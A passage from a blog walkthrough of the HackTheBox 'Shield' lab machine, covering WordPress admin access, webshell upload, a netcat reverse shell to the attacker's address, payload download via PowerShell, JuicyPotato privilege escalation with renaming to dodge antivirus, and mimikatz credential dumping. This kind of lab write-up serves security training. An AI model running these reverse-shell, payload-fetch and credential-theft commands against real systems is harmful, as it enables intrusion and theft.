to<code>http://10.10.10.29/wordpress/wp-admin</code> . Now you are end up at login page.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-43.png" class="kg-image" alt loading="lazy" width="1349" height="706" srcset="../content/images/size/w600/2021/05/image-43.png 600w, ../content/images/size/w1000/2021/05/image-43.png 1000w, ../content/images/2021/05/image-43.png 1349w" sizes="(min-width: 720px) 720px"></figure><p>Now you can enter above credentials ☝☝ and click enter. You are successfully logging to the wordpress site as admin. 👑👑</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-44.png" class="kg-image" alt loading="lazy" width="1341" height="735" srcset="../content/images/size/w600/2021/05/image-44.png 600w, ../content/images/size/w1000/2021/05/image-44.png 1000w, ../content/images/2021/05/image-44.png 1341w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-foothold">02. Foothold</h2><p>Now it's time to upload reverse shell. But keep in mind that you are on the Windows machine. So you must have <code>windows php reverse shell</code> to gain access. Let's upload a bind shell. You can download it from <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php" rel="noopener noreferrer">here</a>. And also we need netcat binary file to get reverse shell. You can download it from <a href="https://github.com/int0x33/nc.exe?files=1" rel="noopener noreferrer">here</a>. 😊😊</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php
+wget https://github.com/int0x33/nc.exe/raw/master/nc.exe</code></pre><p>By looking at the dashboard settings, it's obvious that we have an option to upload media, themes, pages, etc. I’ll start from the themes to see what we can do.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-45.png" class="kg-image" alt loading="lazy" width="784" height="692" srcset="../content/images/size/w600/2021/05/image-45.png 600w, ../content/images/2021/05/image-45.png 784w" sizes="(min-width: 720px) 720px"></figure><p>Then click Add New button.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-46.png" class="kg-image" alt loading="lazy" width="955" height="513" srcset="../content/images/size/w600/2021/05/image-46.png 600w, ../content/images/2021/05/image-46.png 955w" sizes="(min-width: 720px) 720px"></figure><p><br>Browse and upload both netcat binary and bind shell php script.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-47.png" class="kg-image" alt loading="lazy" width="1071" height="541" srcset="../content/images/size/w600/2021/05/image-47.png 600w, ../content/images/size/w1000/2021/05/image-47.png 1000w, ../content/images/2021/05/image-47.png 1071w" sizes="(min-width: 720px) 720px"></figure><p>Click "Install Now" button to upload. When you upload the files, You might get an error like this. It's just ok to ignore this error. 😉😉</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-48.png" class="kg-image" alt loading="lazy" width="1029" height="388" srcset="../content/images/size/w600/2021/05/image-48.png 600w, ../content/images/size/w1000/2021/05/image-48.png 1000w, ../content/images/2021/05/image-48.png 1029w" sizes="(min-width: 720px) 720px"></figure><p>Then navigate to<code>http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=dir</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9a8-AHdQanTEn7xXX%2Fimage.png?alt=media&amp;token=3d967050-fde1-47d1-8870-9d35b320079e" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>As you can see, now we have a simple bind shell. Let's gain reverse shell using this with the help of our netcat binary file. First, power up a netcat listener then navigate to following url. (Change the <code>&lt;YourIP&gt;</code> and <code>&lt;PORT&gt;</code> as yours). <code>%20</code> is indicated as space in url encoding. 😋😋</p><p><code>http://10.10.10.29/Wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%20&lt;YourIP&gt;%20&lt;PORT&gt;</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9bcymZhCbDUY9MRSH%2Fimage.png?alt=media&amp;token=3d2aa86d-f7d5-4d2d-bdce-ee98818a8ba4" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Now we are on the box as <code>iusr</code>user. Let's find the user flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9byqS0wXbsGl3qeD3%2Fimage.png?alt=media&amp;token=759afd63-8c52-4703-a203-ca2b4566d705" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Here we have one user called <code>sandra</code>and we don't have access to this account. It's means this is time to escalate privileges.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-49.png" class="kg-image" alt loading="lazy" width="480" height="200"></figure><hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>Let's enumerate further to get any vulnerability to gain privilege access. First, we need to check system info.</p><pre><code class="language-bash">C:\Users&gt;systeminfo
+systeminfo
+
+Host Name:                 SHIELD
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00376-30000-00299-AA303
+Original Install Date:     2/4/2020, 12:58:01 PM
+System Boot Time:          5/20/2021, 9:43:58 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,031 MB
+Virtual Memory: Max Size:  2,431 MB
+Virtual Memory: Available: 1,375 MB
+Virtual Memory: In Use:    1,056 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    MEGACORP.LOCAL
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.29
+                                 [02]: fe80::1588:3a1b:bef9:58b8
+                                 [03]: dead:beef::1588:3a1b:bef9:58b8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre><p>Then check what privileges we have now.</p><pre><code class="language-bash">C:\Users&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled 👈
+SeCreateGlobalPrivilege Create global objects                     Enabled</code></pre><p>Woooh!! We have the <code>SeImpersonatePrivilege</code>enabled. 🤩🤩 You know what it means, it means we can run <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">juicy potato</a> to gain privilege. 🥔🥔Let's do it..</p><blockquote>Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the <code>SeAssignPrimaryToken</code> or <code>SeImpersonate</code> privilege in a MiTM attack.</blockquote><p>Download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" rel="noopener noreferrer">JuicyPotato </a>binary file and rename it to another file name. Because sometimes windows defender will hate us. And we need to upload it to the box. To do so, power up python demon web server on your machine.</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# mv JuicyPotato.exe potato.exe
+
+┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>Then we need to upload it in to the box. Type the following command on windows machine <code>(Change &lt;YourIP&gt;)</code>.</p><pre><code class="language-bash">Powershell -c "IWR -useBasicParsing http://&lt;YourIP&gt;:8000/potato.exe -o potato.exe"</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-50.png" class="kg-image" alt loading="lazy" width="1208" height="270" srcset="../content/images/size/w600/2021/05/image-50.png 600w, ../content/images/size/w1000/2021/05/image-50.png 1000w, ../content/images/2021/05/image-50.png 1208w" sizes="(min-width: 720px) 720px"></figure><p><br>If you read the <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">documentation </a>of Juicy Potato you will realize it needs Batch file to run. So now we need to create bat file using following commands.</p><pre><code class="language-bash">echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe YourIP YourPort &gt; sh3ll.bat</code></pre><p>Change <code>YourIP </code>and <code>YourPort </code>as yours. After create the batch file, view that file using <code>type </code>command to verify.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-51.png" class="kg-image" alt loading="lazy" width="1461" height="132" srcset="../content/images/size/w600/2021/05/image-51.png 600w, ../content/images/size/w1000/2021/05/image-51.png 1000w, ../content/images/2021/05/image-51.png 1461w" sizes="(min-width: 720px) 720px"></figure><p><br>Then all the things are fine. Now it's time to exploit. Let's power up netcat listener again and execute the following command. If you failed to get reverse shell; change the <code>-c</code> parameter (CLSID) from using <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard" rel="noopener noreferrer">this </a>document and run again. 😎</p><pre><code class="language-bash">.\potato.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\inetpub\wwwroot\wordpress\wp-content\Uploads\sh3ll.bat -l 1337</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-52.png" class="kg-image" alt loading="lazy" width="1599" height="434" srcset="../content/images/size/w600/2021/05/image-52.png 600w, ../content/images/size/w1000/2021/05/image-52.png 1000w, ../content/images/2021/05/image-52.png 1599w" sizes="(min-width: 720px) 720px"></figure><p><br>We are done. Now we have ultimate power. 🤠🤠</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-53.png" class="kg-image" alt loading="lazy" width="731" height="328" srcset="../content/images/size/w600/2021/05/image-53.png 600w, ../content/images/2021/05/image-53.png 731w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-54.png" class="kg-image" alt loading="lazy" width="851" height="773" srcset="../content/images/size/w600/2021/05/image-54.png 600w, ../content/images/2021/05/image-54.png 851w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation">04. Post Exploitation</h3><p>Now we are at <code>NT AUTHORITY\SYSTEM</code> level. So let’s upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz </a>and see what we can pull. Mimikatz can be used to dump cached passwords. Download  <code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-55.png" class="kg-image" alt loading="lazy" width="1124" height="493" srcset="../content/images/size/w600/2021/05/image-55.png 600w, ../content/images/size/w1000/2021/05/image-55.png 1000w, ../content/images/2021/05/image-55.png 1124w" sizes="(min-width: 720px) 720px"></figure><p>Then we can run that file by typing <code>.\mcat</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-56.png" class="kg-image" alt loading="lazy" width="919" height="382" srcset="../content/images/size/w600/2021/05/image-56.png 600w, ../content/images/2021/05/image-56.png 919w" sizes="(min-width: 720px) 720px"></figure><p><br>We execute mimikatz and use the sekurlsa command to extract logon passwords: <code>sekurlsa::logonpasswords</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-57.png" class="kg-image" alt loading="lazy" width="803" height="491" srcset="../content/images/size/w600/2021/05/image-57.png 600w, ../content/images/2021/05/image-57.png 803w" sizes="(min-width: 720px) 720px"></figure><p>And we found the password <code>Password1234!</code> for domain user <code>Sandra </code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaCWJxaHniWSpPAiRIa%2F-MaCX1_CLo6zsW-pdUev%2Fimage.png?alt=media&amp;token=4c52c5e6-1f75-4d78-9363-ee53dd0992ec" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a> </p>
+                <section class="m-tags in-post">
+                  <h3 class="m-submenu-title">Tags</h3>
+                  <ul>
+                      <li>
+                        <a href="../tag/h4rithd/index.html" title="h4rithd">h4rithd</a>
+                      </li>
+                      <li>
+                        <a href="../tag/hackthebox/index.html" title="HackTheBox">HackTheBox</a>
+                      </li>
+                      <li>
+                        <a href="../tag/harithdilshan/index.html" title="HarithDilshan">HarithDilshan</a>
+                      </li>
+                      <li>
+                        <a href="../tag/htb-walkthrough/index.html" title="HTB Walkthrough">HTB Walkthrough</a>
+                      </li>
+                      <li>
+                        <a href="../tag/htb-writeup/index.html" title="HTB Writeup">HTB Writeup</a>
+                      </li>
+                      <li>
+                        <a href="../tag/startingpoint/index.html" title="StartingPoint">StartingPoint</a>
+                      </li>
+                      <li>
+                        <a href="../tag/writeup/index.html" title="Writeup">Writeup</a>
+                      </li>
+                      <li>
+                        <a href="../tag/shield-walkthrough/index.html" title="Shield Walkthrough">Shield Walkthrough</a>
+                      </li>
+                      <li>
+                        <a href="../tag/shield/index.html" title="Shield">Shield</a>
+                      </li>
+                  </ul>
+                </section>
+            </div>
+          </div>
+        </div>
+        <section class="m-subscribe-section js-newsletter">
+          <div class="l-wrapper in-post">
+            <div class="m-subscribe-section__content">
+              <div class="m-subscribe-section__text">
+                <h4 class="m-subscribe-section__title">Subscribe to our newsletter</h4>
+                <p class="m-subscribe-section__description">
+                  Get the latest posts delivered right to your inbox.
+                </p>
+              </div>
+              <div class="m-subscribe-section__form">
+                
+<div class="m-subscribe-section__form">
+  <form data-members-form="subscribe" id="newsletter-form" class="m-subscribe-section__container">
+    <div class="m-subscribe__form">
+      <div class="pos-relative">
+        <label for="newsletter-input" class="sr-only">Your email address</label>
+        <input data-members-email id="newsletter-input" class="m-input in-subscribe-section" type="email"
+          placeholder="Your email address" required />
+      </div>
+      <button id="newsletter-button" class="m-button primary block" type="submit">Subscribe</button>
+    </div>
+    <div class="m-subscribe__success">
+      <header class="m-heading no-margin">
+        <img src="../assets/images/success.png%3Fv=5e4dc0b160" alt="Success!" class="m-subscribe__success_icon">
+        <p class="m-heading__description in-newsletter-form">
+          Now check your inbox and click the link to confirm your subscription.
+        </p>
+      </header>
+    </div>
+    <p class="m-subscribe__invalid m-small-text">
+      Please enter a valid email address
+    </p>
+    <p class="m-subscribe__error m-small-text">
+      Oops! There was an error sending the email, please try later.
+    </p>
+  </form>
+</div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="m-author">
+          <div class="m-author__content">
+            <div class="m-author__picture">
+              <a href="../author/harith/index.html" class="m-author-picture" aria-label="Harith Dilshan">
+                  <div style="background-image: url(../content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg);"></div>
+              </a>
+            </div>
+            <div class="m-author__info">
+              <h4 class="m-author__name">
+                <a href="../author/harith/index.html">Harith Dilshan</a>
+              </h4>
+              <ul class="m-author-links">
+              </ul>
+            </div>
+          </div>
+        </section>
+          <section class="m-recommended">
+            <div class="l-wrapper in-recommended">
+              <h3 class="m-section-title in-recommended">Recommended for you</h3>
+              <div class="m-recommended-articles">
+                <div class="m-recommended-slider glide js-recommended-slider">
+                  <div class="glide__track" data-glide-el="track">
+                    <div class="glide__slides">
+                      
+    <div class="m-recommended-slider__item glide__slide">
+  <article class="m-article-card  post tag-h4rithd tag-hackthebox tag-harithdilshan tag-htb-walkthrough tag-htb-writeup tag-startingpoint tag-writeup tag-included-walkthrough tag-included">
+    <div class="m-article-card__picture">
+      <a href="../starting-point-htb-included-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
+        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/05/6.jpg" loading="lazy" alt="">
+      <a href="../author/harith/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
+          <div style="background-image: url(../content/images/size/w100/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg);"></div>
+      </a>
+    </div>
+      <div class="m-article-card__info">
+        <a href="../tag/h4rithd/index.html" class="m-article-card__tag">h4rithd</a>
+      <a href="../starting-point-htb-included-walkthrough/index.html" class="m-article-card__info-link" aria-label="Included Walkthrough">
+        <div>
+          <h2 class="m-article-card__title js-article-card-title " title="Included Walkthrough">
+            Included Walkthrough
+          </h2>
+        </div>
+        <div class="m-article-card__timestamp">
+          <span>2 days ago</span>
+          <span>&bull;</span>
+          <span>9 min read</span>
+        </div>
+      </a>
+    </div>
+  </article>
+    </div>
+    <div class="m-recommended-slider__item glide__slide">
+  <article class="m-article-card  post tag-h4rithd tag-hackthebox tag-harithdilshan tag-htb-walkthrough tag-htb-writeup tag-startingpoint tag-writeup tag-pathfinder-walkthrough tag-pathfinder">
+    <div class="m-article-card__picture">
+      <a href="../starting-point-htb-pathfinder-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
+        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/05/5.jpg" loading="lazy" alt="">
+      <a href="../author/harith/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
+          <div style="background-image: url(../content/images/size/w100/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg);"></div>
+      </a>
+    </div>
+      <div class="m-article-card__info">
+        <a href="../tag/h4rithd/index.html" class="m-article-card__tag">h4rithd</a>
+      <a href="../starting-point-htb-pathfinder-walkthrough/index.html" class="m-article-card__info-link" aria-label="Pathfinder Walkthrough">
+        <div>
+          <h2 class="m-article-card__title js-article-card-title " title="Pathfinder Walkthrough">
+            Pathfinder Walkthrough
+          </h2>
+        </div>
+        <div class="m-article-card__timestamp">
+          <span>20 days ago</span>
+          <span>&bull;</span>
+          <span>10 min read</span>
+        </div>
+      </a>
+    </div>
+  </article>
+    </div>
+    <div class="m-recommended-slider__item glide__slide">
+  <article class="m-article-card  post tag-h4rithd tag-hackthebox tag-harithdilshan tag-htb-walkthrough tag-htb-writeup tag-startingpoint tag-writeup tag-vaccine tag-vaccine-walkthrough">
+    <div class="m-article-card__picture">
+      <a href="../vaccine-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
+        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/05/3.jpg" loading="lazy" alt="">
+      <a href="../author/harith/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
+          <div style="background-image: url(../content/images/size/w100/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg);"></div>
+      </a>
+    </div>
+      <div class="m-article-card__info">
+        <a href="../tag/h4rithd/index.html" class="m-article-card__tag">h4rithd</a>
+      <a href="../vaccine-walkthrough/index.html" class="m-article-card__info-link" aria-label="Vaccine Walkthrough">
+        <div>
+          <h2 class="m-article-card__title js-article-card-title " title="Vaccine Walkthrough">
+            Vaccine Walkthrough
+          </h2>
+        </div>
+        <div class="m-article-card__timestamp">
+          <span>a month ago</span>
+          <span>&bull;</span>
+          <span>9 min read</span>
+        </div>
+      </a>
+    </div>
+  </article>
+    </div>
+                    </div>
+                  </div>
+                  <div data-glide-el="controls" class="glide__arrows js-controls">
+                    <button data-glide-dir="<" class="m-icon-button filled in-recommended-articles glide-prev" aria-label="Previous">
+                      <span class="icon-arrow-left" aria-hidden="true"></span>
+                    </button>
+                    <button data-glide-dir=">" class="m-icon-button filled in-recommended-articles glide-next" aria-label="Next">
+                      <span class="icon-arrow-right" aria-hidden="true"></span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+    </div>
+  </article>
+</main>
+
+
+
+    
+<div class="m-search js-search" role="dialog" aria-modal="true" aria-label="Search">
+  <button class="m-icon-button outlined as-close-search js-close-search" aria-label="Close search">
+    <span class="icon-close" aria-hidden="true"></span>
+  </button>
+  <div class="m-search__content">
+    <form class="m-search__form">
+      <div class="pos-relative">
+        <span class="icon-search m-search-icon" aria-hidden="true"></span>
+        <label for="search-input" class="sr-only">
+          Type to search
+        </label>
+        <input id="search-input" type="text" class="m-input in-search js-input-search" placeholder="Type to search">
+      </div>
+    </form>
+    <div class="js-search-results hide"></div>
+    <p class="m-not-found align-center hide js-no-results">
+      No results for your search, please try with something else.
+    </p>
+  </div>
+</div>
+
+    
+<footer class="m-footer">
+  <div class="m-footer__content">
+    <nav class="m-footer-social">
+        <a href="https://www.facebook.com/ShapManasick" target="_blank" rel="noopener" aria-label="Facebook">
+          <span class="icon-facebook" aria-hidden="true"></span>
+        </a>
+        <a href="https://twitter.com/h4rithd" target="_blank" rel="noopener" aria-label="Twitter">
+          <span class="icon-twitter" aria-hidden="true"></span>
+        </a>
+      <a href="http://192.168.8.3:2368/rss" aria-label="RSS">
+        <span class="icon-rss" aria-hidden="true"></span>
+      </a>
+    </nav>
+    <p class="m-footer-copyright">
+      <span>h4rithd.com &copy; 2021</span>
+      <span>&nbsp; &bull; &nbsp;</span>
+      <span>Published with <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a></span>
+    </p>
+    <p class="m-footer-copyright jslicense">
+      <a href="../assets/html/javascript.html%3Fv=5e4dc0b160.html" rel="jslicense">JavaScript license information</a>
+    </p>
+  </div>
+</footer>
+
+    <div class="m-alert success subscribe js-alert" data-notification="subscribe">
+  Great! You&#x27;ve successfully subscribed.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+
+<div class="m-alert success signup js-alert" data-notification="signup">
+  Great! Next, complete checkout for full access.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+
+<div class="m-alert success signin js-alert" data-notification="signin">
+  Welcome back! You&#x27;ve successfully signed in.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+
+<div class="m-alert success checkout js-alert" data-notification="checkout">
+  Success! Your account is fully activated, you now have access to all content.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+    <script crossorigin="anonymous" src="https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserver%2CPromise%2CArray.prototype.includes%2CString.prototype.endsWith%2CString.prototype.startsWith%2CObject.assign%2CNodeList.prototype.forEach"></script>
+    <script defer src="../assets/js/manifest.js%3Fv=5e4dc0b160"></script>
+    <script defer src="../assets/js/vendor/content-api.min.js%3Fv=5e4dc0b160"></script>
+    <script defer src="../assets/js/vendor.js%3Fv=5e4dc0b160"></script>
+    <script defer src="../assets/js/app.js%3Fv=5e4dc0b160"></script>
+
+      <script defer src="../assets/js/post.js%3Fv=5e4dc0b160"></script>
+
+
+    
+  </body>
+</html>
